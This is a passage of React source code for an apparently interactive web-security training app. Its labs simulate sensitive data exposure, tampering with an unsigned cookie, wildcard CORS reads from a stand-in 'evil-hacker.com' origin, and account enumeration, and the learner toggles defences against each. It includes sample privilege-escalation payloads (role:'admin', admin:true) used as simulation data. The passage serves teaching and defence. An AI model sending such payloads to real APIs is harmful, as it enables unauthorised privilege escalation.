                      <span className={`text-xs flex-shrink-0 ${isOn ? "text-green-400" : showDetail ? "text-red-400" : "text-slate-700"}`}>
                        {isOn ? "✓" : showDetail ? "✗" : "○"}
                      </span>
                      <span className={`text-xs font-mono flex-1 ${isOn ? "text-slate-300" : "text-slate-500"}`}>{h.label}</span>
                      <span className={`text-[10px] px-1.5 py-0.5 rounded ${isOn ? "bg-green-900/40 text-green-400" : "bg-slate-800 text-slate-500"}`}>
                        {h.attack}
                      </span>
                    </div>
                    {showDetail && (
                      <p className="text-[10px] text-red-300/70 mt-1.5 pl-4">{h.risk}</p>
                    )}
                  </div>
                );
              })}
            </div>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Toggle all 5 headers on, then click <strong>Run Audit</strong>. The audit panel will show each vulnerability moving from red (missing) to green (fixed). The score gauge reaches 5/5 — all browser-level attack vectors closed.</p>}
        failMsg={`Audit failed — ${5-count} header${5-count!==1?"s":""} still missing. Add all remaining headers and run the audit again.`}
        successTitle="Audit Passed" failTitle="Audit Failed"
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};


// ─── PAGE 4 DATA ──────────────────────────────────────────────────────────────
const SDE_ITEMS = [
  { id:"h1", label:'Server: Apache/2.4.51 (Ubuntu)',       isLeak:true,  risk:"Reveals exact web server version — attackers search known CVEs for this release" },
  { id:"h2", label:'X-Powered-By: PHP/8.0.3',             isLeak:true,  risk:"Exposes backend language and version — aids targeted exploit selection" },
  { id:"h3", label:'X-Debug-Token: dev-mode-a4f9',        isLeak:true,  risk:"Debug token confirms dev mode is on in production — exposes profiling endpoints" },
  { id:"h4", label:'Content-Type: text/html; charset=utf-8', isLeak:false, risk:"" },
  { id:"h5", label:'X-Request-Id: 4f7a-92c3-11ee',        isLeak:false, risk:"" },
  { id:"b1", label:'DB_HOST: 10.0.1.42, DB_NAME: app_prod', isLeak:true, risk:"Internal network address and database name let attackers target DB directly" },
  { id:"b2", label:'at UserModel.php:147 → Controller.php:89', isLeak:true, risk:"File system paths reveal code structure and framework — useful for targeted attacks" },
  { id:"b3", label:'SQLSTATE[HY000]: Access denied for app@10.0.1.42', isLeak:true, risk:"DB credentials format and hostname exposed in the error message" },
  { id:"b4", label:'Please enter a valid username', isLeak:false, risk:"" },
];
const SDE_HEADERS_SAFE  = ['Content-Type: application/json', 'X-Request-Id: 4f7a-92c3-11ee', 'Cache-Control: no-store'];
const SDE_HEADERS_LEAK  = ['Server: Apache/2.4.51 (Ubuntu)', 'X-Powered-By: PHP/8.0.3', 'X-Debug-Token: dev-mode-a4f9', 'Content-Type: text/html; charset=utf-8', 'X-Request-Id: 4f7a-92c3-11ee'];
const SDE_BODY_SAFE     = 'HTTP 500 — An error occurred. Please try again later.\nReference: ERR-4f7a';
const SDE_BODY_LEAK     = `PDOException: SQLSTATE[HY000]: Access denied\nfor user 'app'@'10.0.1.42' (DB_NAME: app_prod)\n\n#0 /var/www/html/models/UserModel.php:147\n#1 /var/www/html/controllers/Auth.php:89\n\nDB_HOST: 10.0.1.42, DB_NAME: app_prod\nDB_USER: app, ENVIRONMENT: production`;

const DESER_ORIG = { role:"user", plan:"basic", userId:42, exp:1735689600 };
const DESER_TAMP = { role:"admin", plan:"premium", userId:42, exp:1735689600 };
const encB64 = (obj) => { try { return btoa(JSON.stringify(obj)); } catch { return ""; } };

const CORS_ORIGINS = [
  { id:"co1", label:"Attacker site",     origin:"https://evil-hacker.com",    sev:"critical" },
  { id:"co2", label:"Competitor",        origin:"https://competitor-corp.io",  sev:"high"     },
  { id:"co3", label:"Phishing domain",   origin:"https://app.examp1e.com",     sev:"critical" },
  { id:"co4", label:"Same origin (safe)",origin:"https://app.example.com",     sev:"info"     },
];
const FAKE_CORS_DATA = { balance:15420.50, accountNumber:"****4821", transactions:[{id:1,amount:-42.00,desc:"Netflix"},{id:2,amount:-8.99,desc:"Spotify"},{id:3,amount:2000,desc:"Payroll"}] };

const AE_USERS = { alice:"correctpassword123", bob:"hunter2secure" };
const AE_ATTEMPTS = [
  { id:"ae1", label:"Valid user, wrong password",  username:"alice",        password:"wrongpass",          exists:true,  correct:false },
  { id:"ae2", label:"Invalid username",            username:"notauser1337", password:"password123",         exists:false, correct:false },
  { id:"ae3", label:"Valid user, correct password",username:"alice",        password:"correctpassword123",  exists:true,  correct:true  },
  { id:"ae4", label:"Another invalid username",    username:"fakeperson99", password:"letmein",             exists:false, correct:false },
];

const MA_INITIAL_USER = { id:42, name:"Jane Doe", email:"jane@example.com", role:"user", admin:false, verified:true, credits:50 };
const MA_PAYLOADS = [
  { id:"ma1", label:"Name update (legitimate)",    fields:{ name:"Jane Smith" },             sev:"info"     },
  { id:"ma2", label:"Role escalation",             fields:{ name:"Jane", role:"admin" },     sev:"critical" },
  { id:"ma3", label:"Admin flag injection",        fields:{ name:"Jane", admin:true },       sev:"critical" },
  { id:"ma4", label:"Credit balance manipulation", fields:{ name:"Jane", credits:99999 },    sev:"high"     },
  { id:"ma5", label:"Email + verified bypass",     fields:{ email:"other@corp.com", verified:true }, sev:"high" },
];
const MA_ALLOWED_FIELDS = ["name","email"];

// ─── DASHBOARD MODULE DEFINITIONS P4 ─────────────────────────────────────────
const DASH_MODULES_P4 = [
  {
    id:"sde", Icon:Info, label:"Sensitive Data Exposure", difficulty:"Beginner",
    shortDesc:"Server leaking version info, stack traces, and secrets",
    fullDesc:"Sensitive data exposure occurs when applications reveal internal details — server versions, stack traces, DB connection strings — in HTTP responses or error messages. Attackers use this fingerprinting data to target specific known vulnerabilities in the exposed software.",
    concepts:["Header Sanitization","Error Message Hardening","Debug Mode in Production"],
    color:"teal",
  },
  {
    id:"deserialize", Icon:Database, label:"Insecure Deserialization", difficulty:"Intermediate",
    shortDesc:"Tampering with unsigned client-side session data",
    fullDesc:"Insecure deserialization occurs when applications trust serialized data from the client without verifying its integrity. An attacker can modify a base64-encoded cookie that contains their role or permissions — changing 'user' to 'admin' — and the server accepts it without question.",
    concepts:["HMAC Cookie Signing","Server-side Sessions","Integrity Verification"],
    color:"amber",
  },
  {
    id:"cors", Icon:Globe, label:"CORS Misconfiguration", difficulty:"Intermediate",
    shortDesc:"Cross-origin scripts reading private API responses",
    fullDesc:"A wildcard CORS policy (Access-Control-Allow-Origin: *) allows any website's JavaScript to read responses from your API. An attacker's page can silently fetch a logged-in user's account data and exfiltrate it — without the user ever knowing.",
    concepts:["Specific Origin Policy","Credential Handling","Pre-flight Requests"],
    color:"purple",
  },
  {
    id:"accountenum", Icon:Users, label:"Account Enumeration", difficulty:"Beginner",
    shortDesc:"Using login error messages to discover valid usernames",
    fullDesc:"Login forms that return different error messages for 'username not found' vs 'wrong password' allow attackers to enumerate which usernames are registered. With a list of valid usernames, targeted credential stuffing and spear-phishing become far more effective.",
    concepts:["Generic Error Messages","Consistent Response Timing","Rate Limiting"],
    color:"green",
  },
  {
    id:"massassign", Icon:List, label:"Mass Assignment", difficulty:"Intermediate",
    shortDesc:"Injecting extra fields into API requests to escalate privileges",
    fullDesc:"Mass assignment vulnerabilities occur when an API binds all request body fields to an object without filtering. Sending admin:true or role:'admin' alongside a legitimate name update silently escalates the attacker's privileges — the server processes every field it receives.",
    concepts:["Field Allowlisting","Schema Validation","Explicit Property Binding"],
    color:"orange",
  },
];

// ─── SENSITIVE DATA EXPOSURE LAB ──────────────────────────────────────────────
const SDELab = ({ addLog, addScore, onBack }) => {
  const [def, setDef]           = useState({ stripVersionHeaders:false, disableDebug:false, sanitizeErrors:false });
  const [labState, setLabState] = useState("idle");
  const [checked, setChecked]   = useState({});
  const [analyzed, setAnalyzed] = useState(false);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setChecked({}); setAnalyzed(false); setJustScored(false); };

  const shownHeaders = def.stripVersionHeaders && def.disableDebug ? SDE_HEADERS_SAFE : SDE_HEADERS_LEAK;
  const shownBody    = def.sanitizeErrors ? SDE_BODY_SAFE : SDE_BODY_LEAK;
  const allFixed     = def.stripVersionHeaders && def.disableDebug && def.sanitizeErrors;

  const analyze = () => {
    const leakIds  = new Set(SDE_ITEMS.filter(i=>i.isLeak).map(i=>i.id));
    const got      = new Set(Object.keys(checked).filter(k=>checked[k]));
    const correct  = [...got].filter(k=>leakIds.has(k)).length;
    const fp       = [...got].filter(k=>!leakIds.has(k)).length;
    const missed   = leakIds.size - correct;
    const success  = correct === leakIds.size && fp === 0;
    setAnalyzed(true);
    setLabState(success ? "success" : "fail");
    addLog(mkEvent("sde","Analyst","HTTP Response","info",`SDE check: ${correct}/${leakIds.size} leaks found, ${fp} FP`));
    if (success && !scoredRef.current.has("sde")) { addScore("sde",25); scoredRef.current.add("sde"); setJustScored(true); }
    else setJustScored(false);
  };

  const sdeReveal = (
    <p>In the checklist, the leaks are: <strong className="text-slate-200">Server version</strong>, <strong className="text-slate-200">X-Powered-By</strong>, <strong className="text-slate-200">X-Debug-Token</strong> (all in headers), and in the body: <strong className="text-slate-200">DB_HOST/DB_NAME</strong>, <strong className="text-slate-200">file paths</strong>, and the <strong className="text-slate-200">SQLSTATE error detail</strong>. Then enable all three server defenses to see what a sanitised response looks like.</p>
  );

  const successContent = (
    <div>
      <p>You correctly identified all {SDE_ITEMS.filter(i=>i.isLeak).length} data exposure risks. Each leaked value gives attackers a free fingerprint of your stack — software versions can be cross-referenced against CVE databases to find exploitable vulnerabilities without touching the server directly.</p>
    </div>
  );

  const toggleItem = (id) => { if (analyzed) return; setChecked(p=>({...p,[id]:!p[id]})); };
  const leakIds = new Set(SDE_ITEMS.filter(i=>i.isLeak).map(i=>i.id));

  return (
    <div className="space-y-4">
      <LabHeader title="Sensitive Data Exposure" subtitle="Identify what the server is leaking, then configure defenses to sanitise it" onBack={onBack}/>
      <ChallengeBox accent="teal" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={sdeReveal}>
        Your app just returned a 500 error. Review the HTTP response on the right — check every item that <strong>should not</strong> be exposed to users. Then enable server defenses to see a hardened response.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Step 1 — Identify Data Leaks</SectionHead>
            <p className="text-xs text-slate-600 mb-3">Review the HTTP response on the right. Check every item that leaks sensitive information. False positives reduce your score.</p>
            <div className="text-[10px] text-slate-600 font-semibold uppercase tracking-wide mb-1.5">Response Headers</div>
            <div className="space-y-1 mb-3">
              {SDE_ITEMS.filter(i=>i.id.startsWith("h")).map(item=>{
                const isOn    = !!checked[item.id];
                const isRight = showAnswer && isOn && item.isLeak;
                const isMiss  = showAnswer && !isOn && item.isLeak;
                const isFP    = showAnswer && isOn && !item.isLeak;
                return (
                  <div key={item.id} onClick={()=>toggleItem(item.id)}
                    className={`flex items-start gap-2 p-2 rounded border text-[11px] select-none transition-colors ${analyzed?"cursor-default":"cursor-pointer"} ${isRight?"bg-green-900/20 border-green-500/30":isMiss?"bg-red-900/20 border-red-500/30":isFP?"bg-orange-900/20 border-orange-500/30":isOn?"bg-slate-800/60 border-slate-700":"border-transparent hover:bg-slate-800/30"}`}>
                    <div className={`mt-0.5 w-3.5 h-3.5 rounded flex-shrink-0 border flex items-center justify-center ${isOn?"bg-cyan-500 border-cyan-500":"border-slate-600"}`}>
                      {isOn && <span className="text-white text-[9px] font-bold">✓</span>}
                    </div>
                    <div className="flex-1">
                      <span className="font-mono text-slate-300">{item.label}</span>
                      {showAnswer && isMiss && <div className="text-red-400 text-[10px] mt-0.5">✗ Missed — {item.risk}</div>}
                      {showAnswer && isFP && <div className="text-orange-400 text-[10px] mt-0.5">✗ False positive — this is a normal header</div>}
                      {showAnswer && isRight && <div className="text-green-400 text-[10px] mt-0.5">✓ Correct leak</div>}
                    </div>
                  </div>
                );
              })}
            </div>
            <div className="text-[10px] text-slate-600 font-semibold uppercase tracking-wide mb-1.5">Response Body</div>
            <div className="space-y-1">
              {SDE_ITEMS.filter(i=>i.id.startsWith("b")).map(item=>{
                const isOn    = !!checked[item.id];
                const isRight = showAnswer && isOn && item.isLeak;
                const isMiss  = showAnswer && !isOn && item.isLeak;
                const isFP    = showAnswer && isOn && !item.isLeak;
                return (
                  <div key={item.id} onClick={()=>toggleItem(item.id)}
                    className={`flex items-start gap-2 p-2 rounded border text-[11px] select-none transition-colors ${analyzed?"cursor-default":"cursor-pointer"} ${isRight?"bg-green-900/20 border-green-500/30":isMiss?"bg-red-900/20 border-red-500/30":isFP?"bg-orange-900/20 border-orange-500/30":isOn?"bg-slate-800/60 border-slate-700":"border-transparent hover:bg-slate-800/30"}`}>
                    <div className={`mt-0.5 w-3.5 h-3.5 rounded flex-shrink-0 border flex items-center justify-center ${isOn?"bg-cyan-500 border-cyan-500":"border-slate-600"}`}>
                      {isOn && <span className="text-white text-[9px] font-bold">✓</span>}
                    </div>
                    <div className="flex-1">
                      <span className="font-mono text-slate-300">{item.label}</span>
                      {showAnswer && isMiss && <div className="text-red-400 text-[10px] mt-0.5">✗ Missed — {item.risk}</div>}
                      {showAnswer && isFP && <div className="text-orange-400 text-[10px] mt-0.5">✗ False positive</div>}
                      {showAnswer && isRight && <div className="text-green-400 text-[10px] mt-0.5">✓ Correct leak</div>}
                    </div>
                  </div>
                );
              })}
            </div>
            <button onClick={analyze} disabled={analyzed}
              className={`mt-4 w-full flex items-center justify-center gap-2 font-semibold py-2 px-4 rounded-lg transition-colors text-sm ${analyzed?"opacity-40 cursor-not-allowed bg-cyan-800":"bg-cyan-700 hover:bg-cyan-600"} text-white`}>
              <Play size={14}/> Analyze Response
            </button>
            {analyzed && labState==="fail" && (
              <p className="mt-2 text-xs text-slate-500">Click <span className="text-cyan-400">Reveal Answer</span> below to see which items you missed.</p>
            )}
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Live HTTP Response</SectionHead>
            <div className="bg-slate-950 rounded-lg border border-slate-700 overflow-hidden">
              <div className="bg-red-900/20 border-b border-slate-700 px-3 py-1.5 font-mono text-[11px] text-red-400">
                HTTP/1.1 500 Internal Server Error
              </div>
              <div className="p-3">
                <div className="text-[10px] text-slate-600 font-semibold mb-1.5">HEADERS</div>
                {shownHeaders.map((h,i)=>(
                  <div key={i} className={`font-mono text-[11px] mb-0.5 ${h.includes("Apache")||h.includes("PHP")||h.includes("Debug")?"text-red-300":"text-slate-400"}`}>{h}</div>
                ))}
                <div className="text-[10px] text-slate-600 font-semibold mt-3 mb-1.5">BODY</div>
                <pre className={`font-mono text-[11px] whitespace-pre-wrap leading-relaxed ${def.sanitizeErrors?"text-green-400":"text-red-300"}`}>{shownBody}</pre>
              </div>
            </div>
          </Card>
          <Card>
            <SectionHead>Step 2 — Fix the Leaks</SectionHead>
            <p className="text-xs text-slate-600 mb-3">After identifying the leaks above, enable these server-side defenses and watch the response update in real time.</p>
            <div className="space-y-3 mb-3">
              <Toggle enabled={def.stripVersionHeaders} onChange={v=>{setDef(d=>({...d,stripVersionHeaders:v}));}} label="Strip Version Headers" desc="Remove Server: and X-Powered-By: from all responses"/>
              <Toggle enabled={def.disableDebug}       onChange={v=>{setDef(d=>({...d,disableDebug:v}));}}       label="Disable Debug Headers"  desc="Remove X-Debug-Token and debug-only headers in production"/>
              <Toggle enabled={def.sanitizeErrors}     onChange={v=>{setDef(d=>({...d,sanitizeErrors:v}));}}     label="Sanitize Error Messages" desc="Return generic '500 — An error occurred' with no internal details"/>
            </div>
            {allFixed && (
              <div className="flex items-center gap-1.5 text-xs text-green-400 bg-green-900/20 border border-green-500/20 rounded-lg px-3 py-2">
                <CheckCircle size={11}/> All defenses active — response contains no sensitive data
              </div>
            )}
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>The leaks are: <strong className="text-slate-200">Server:</strong> (Apache version), <strong className="text-slate-200">X-Powered-By:</strong> (PHP version), <strong className="text-slate-200">X-Debug-Token:</strong>, and in the body: <strong className="text-slate-200">DB_HOST/DB_NAME</strong>, the <strong className="text-slate-200">file paths</strong>, and the <strong className="text-slate-200">SQLSTATE error</strong>. Then enable all three server defenses to see the sanitised response.</p>}
        failMsg="You missed some data leaks or flagged safe items. Reveal the answer to see the full list."
        successTitle="All Leaks Identified" failTitle="Review Needed"
        onRetry={()=>{reset(); setShowSolution(false);}}
        showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── INSECURE DESERIALIZATION LAB ─────────────────────────────────────────────
const DeserializeLab = ({ addLog, addScore, onBack }) => {
  const [tampered, setTampered] = useState(false);
  const [def, setDef]           = useState({ hmacSign:false, serverSession:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const currentData = tampered ? DESER_TAMP : DESER_ORIG;
  const cookieB64   = encB64(currentData);
  const sigSuffix   = ".xR4mP2qK9sT"; // simulated HMAC suffix

  // When server-side sessions are on, the cookie holds only a session ID — never claims
  const sessionMode = def.serverSession;
  const displayCookieName  = sessionMode ? "session_id" : "user_pref";
  const displayCookieValue = sessionMode ? "sess_9f2a4b8c3d1e" : (def.hmacSign ? `${cookieB64}${sigSuffix}` : cookieB64);

  const submit = () => {
    if (!tampered) { setResult({ ok:true }); setLabState("neutral"); return; }
    const blocked = def.hmacSign || def.serverSession;
    if (blocked) {
      const reason = def.hmacSign
        ? "HMAC signature mismatch — cookie was modified after signing; server rejected"
        : "Server-side session: role is stored server-side and never in the cookie — client data is ignored";
      setResult({ ok:false, reason });
      setLabState("success");
      addLog(mkEvent("deserialize","Attacker","App Server","info","Tampered cookie rejected"));
      const key = [def.hmacSign,def.serverSession].join("|");
      if (!scoredRef.current.has(key)) { addScore("deserialize",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setResult({ ok:true, escalated:true });
      setLabState("fail");
      addLog(mkEvent("deserialize","Attacker","App Server","critical","Deserialization privilege escalation — admin access via tampered cookie"));
    }
  };

  const dsReveal = (
    <p>Enable <strong className="text-slate-200">HMAC Cookie Signing</strong>: the server computes <code className="text-slate-400">HMAC(cookie, secret)</code> and appends the signature. On the next request, it re-verifies — any modification to the cookie breaks the signature. Alternatively, <strong className="text-slate-200">Server-side Sessions</strong> move role data off the cookie entirely, making client tampering irrelevant.</p>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Insecure Deserialization" subtitle="Prevent privilege escalation via unsigned client-side session data" onBack={onBack}/>
      <ChallengeBox accent="amber" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={dsReveal}>
        Your app stores role and plan in a base64-encoded cookie. Click <strong>Tamper Cookie</strong> to change <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">role:user</code> → <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">role:admin</code>. Configure a defense, then submit.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Cookie Controls</SectionHead>
            <div className="flex gap-2 mb-3">
              <button onClick={()=>{setTampered(false); reset();}}
                className={`flex-1 text-xs py-2 rounded-lg border transition-colors ${!tampered?"bg-slate-700 border-slate-500 text-white":"bg-slate-900 border-slate-700 text-slate-500 hover:text-slate-300"}`}>
                Original Cookie
              </button>
              <button onClick={()=>{setTampered(true); reset();}}
                className={`flex-1 text-xs py-2 rounded-lg border transition-colors ${tampered?"bg-red-800 border-red-600 text-white":"bg-slate-900 border-slate-700 text-slate-500 hover:text-red-400"}`}>
                ⚠ Tamper Cookie
              </button>
            </div>
            {tampered && (
              <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-2 text-[11px] text-red-400 mb-1">
                Cookie modified: <code>role: "user" → "admin"</code>, <code>plan: "basic" → "premium"</code>
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.hmacSign}      onChange={v=>{setDef(d=>({...d,hmacSign:v})); reset();}}      label="HMAC Cookie Signing"    desc="Server signs the cookie with a secret key — any modification breaks the signature"/>
              <Toggle enabled={def.serverSession} onChange={v=>{setDef(d=>({...d,serverSession:v})); reset();}} label="Server-side Sessions"   desc="Store role/plan server-side; cookie holds only a session ID that can't be tampered"/>
            </div>
            <button onClick={submit}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Submit Request
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Cookie Inspector</SectionHead>
            <div className="bg-slate-950 rounded-lg border border-slate-800 p-2 mb-3 font-mono text-[10px] break-all leading-relaxed">
              <span className="text-slate-500">{displayCookieName}=</span>
              <span className={sessionMode ? "text-slate-400" : tampered ? "text-amber-300" : "text-green-400"}>{displayCookieValue}</span>
            </div>
            {sessionMode ? (
              <div className="bg-green-900/10 border border-green-500/20 rounded-lg p-2 text-[11px] text-green-400">
                Session ID mode: the cookie holds only an opaque ID. Role and plan are stored in the server's session store — tampering the cookie value changes nothing.
              </div>
            ) : (
              <div className="space-y-2">
                <div>
                  <div className={`text-[10px] font-semibold mb-1 ${tampered?"text-amber-400":"text-green-400"}`}>Decoded payload{tampered && " — MODIFIED"}</div>
                  <pre className={`bg-slate-800 rounded p-2 text-[11px] font-mono whitespace-pre-wrap ${tampered?"text-amber-300":"text-slate-300"}`}>{JSON.stringify(currentData, null, 2)}</pre>
                </div>
                {def.hmacSign && (
                  <div>
                    <div className={`text-[10px] font-semibold mb-1 ${tampered?"text-red-400":"text-blue-400"}`}>HMAC Signature{tampered && " — now invalid"}</div>
                    <div className="bg-slate-800 rounded p-2 text-[11px] font-mono text-blue-300">{sigSuffix.slice(1)}</div>
                  </div>
                )}
              </div>
            )}
          </Card>
          {labState !== "idle" && (
            <Card>
              <SectionHead>Server Response</SectionHead>
              {labState === "neutral" && <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs text-green-400">200 OK — original cookie accepted, role: user</div>}
              {labState === "success" && result && <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs"><div className="text-green-400 font-semibold mb-1">401 — Cookie Rejected</div><div className="text-slate-400">{result.reason}</div></div>}
              {labState === "fail" && <div className="bg-red-900/20 border border-red-500/40 rounded-lg p-3 text-xs"><div className="text-red-400 font-semibold mb-1">200 OK — privilege escalation succeeded ⚠</div><div className="text-slate-400">Server trusted the tampered cookie — role: <span className="text-red-300 font-bold">admin</span>, plan: <span className="text-red-300 font-bold">premium</span></div></div>}
            </Card>
          )}
        </div>
      </div>

      <ChallengeResult state={labState}
        successContent={<div><p>{result?.reason} The server must never trust client-supplied data about permissions without verifying it cryptographically. Any value the client can read, they can also modify.</p></div>}
        revealContent={<p>Click <strong className="text-slate-200">Tamper Cookie</strong>, then enable <strong className="text-slate-200">HMAC Signing</strong> and submit. The server re-computes the HMAC on receipt and finds the signature no longer matches the modified payload — request rejected. Without signing, base64 is just encoding, not security — anyone can decode, modify, and re-encode it.</p>}
        failMsg="The tampered cookie was accepted — the attacker gained admin access by editing a cookie. Enable a signing defense and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── CORS MISCONFIGURATION LAB ─────────────────────────────────────────────────
const CORSLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("co1");
  const [def, setDef]           = useState({ specificOrigin:false, requireAuth:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const sel = CORS_ORIGINS.find(o=>o.id===selId) || CORS_ORIGINS[0];
  const isSameOrigin = sel.origin === "https://app.example.com";
  const corsHeader   = def.specificOrigin ? "Access-Control-Allow-Origin: https://app.example.com" : "Access-Control-Allow-Origin: *";

  const attack = () => {
    if (isSameOrigin) { setResult({ safe:true }); setLabState("neutral"); return; }
    const blocked = def.specificOrigin || def.requireAuth;
    if (blocked) {
      const reason = def.specificOrigin
        ? `CORS policy rejects origin "${sel.origin}" — browser blocked the cross-origin read`
        : "API requires Bearer token — attacker's cross-origin request has no valid auth token";
      setResult({ blocked:true, reason });
      setLabState("success");
      addLog(mkEvent("cors","Attacker","API Server","info",`CORS attack blocked from ${sel.origin}`));
      const key = [def.specificOrigin,def.requireAuth,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("cors",25); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setResult({ blocked:false, data:FAKE_CORS_DATA });
      setLabState("fail");
      addLog(mkEvent("cors","Attacker","API Server","critical",`CORS data exfiltrated to ${sel.origin}`));
    }
  };

  const pick = (id) => { setSelId(id); reset(); };

  const corsReveal = (
    <p>Enable <strong className="text-slate-200">Specific Origin Policy</strong>: set <code className="text-slate-400">Access-Control-Allow-Origin: https://app.example.com</code> instead of <code className="text-slate-400">*</code>. The browser will block any cross-origin read from an unlisted origin. As a second layer, <strong className="text-slate-200">Require Authentication</strong> ensures that even if CORS is misconfigured, unauthenticated requests can't read private data.</p>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="CORS Misconfiguration" subtitle="Prevent cross-origin scripts from reading your private API responses" onBack={onBack}/>
      <ChallengeBox accent="purple" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={corsReveal}>
        Your API has <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">Access-Control-Allow-Origin: *</code>. An attacker's page runs a <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">fetch()</code> call to read your users' account data. Configure CORS to block cross-origin reads.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Attacking Origin</SectionHead>
            <div className="space-y-1.5 mb-3">
              {CORS_ORIGINS.map(o=>(
                <button key={o.id} onClick={()=>pick(o.id)}
                  className={`w-full text-left px-3 py-2 rounded-lg border transition-colors text-xs ${selId===o.id?"bg-slate-700 border-slate-500":"bg-slate-800/50 border-slate-800 hover:border-slate-700"}`}>
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-slate-300">{o.origin}</span>
                    <span className={`text-[10px] px-1.5 py-0.5 rounded font-semibold ${o.sev==="critical"?"bg-red-900/60 text-red-400":o.sev==="high"?"bg-amber-900/60 text-amber-400":"bg-green-900/60 text-green-400"}`}>{o.sev}</span>
                  </div>
                  <div className="text-slate-600 text-[10px] mt-0.5">{o.label}</div>
                </button>
              ))}
            </div>
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.specificOrigin} onChange={v=>{setDef(d=>({...d,specificOrigin:v})); reset();}} label="Specific Origin Policy"  desc="Replace * with your exact domain — browsers block all other origins"/>
              <Toggle enabled={def.requireAuth}    onChange={v=>{setDef(d=>({...d,requireAuth:v})); reset();}}    label="Require Authentication"  desc="API rejects requests without a valid Bearer token"/>
            </div>
            <button onClick={attack}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Simulate Cross-Origin Request
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>API Response Headers</SectionHead>
            <div className="bg-slate-950 rounded-lg border border-slate-800 p-3 font-mono text-[11px] space-y-1">
              <div className="text-green-400">HTTP/1.1 200 OK</div>
              <div className={def.specificOrigin ? "text-green-400" : "text-red-300"}>{corsHeader}</div>
              <div className="text-slate-400">Content-Type: application/json</div>
              {def.requireAuth && <div className="text-green-400">WWW-Authenticate: Bearer</div>}
            </div>
            {!def.specificOrigin && (
              <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400">
                <AlertTriangle size={11}/> Wildcard CORS — any origin can read this response
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Result</SectionHead>
            {labState === "idle" && <div className="text-center text-slate-700 text-xs py-6">Run the attack to see what happens</div>}
            {labState === "neutral" && <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-3 text-xs text-blue-400">Same-origin request — CORS policies don't apply to requests from your own domain.</div>}
            {labState === "success" && result && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                <div className="text-green-400 font-semibold mb-1">Cross-Origin Read Blocked</div>
                <div className="text-slate-400">{result.reason}</div>
              </div>
            )}
            {labState === "fail" && result && (
              <div className="space-y-2">
                <div className="flex items-center gap-1.5 text-xs text-red-400 font-semibold"><AlertTriangle size={11}/> Account data read cross-origin</div>
                <div className="bg-slate-950 border border-red-500/20 rounded-lg p-3 font-mono text-[11px]">
                  <div className="text-red-400 mb-1">// Attacker's JS received:</div>
                  <div className="text-red-300">balance: <span className="text-white">${result.data.balance.toLocaleString()}</span></div>
                  <div className="text-red-300">account: <span className="text-white">{result.data.accountNumber}</span></div>
                  <div className="text-red-300">transactions: <span className="text-white">[{result.data.transactions.length} entries]</span></div>
                </div>
              </div>
            )}
          </Card>
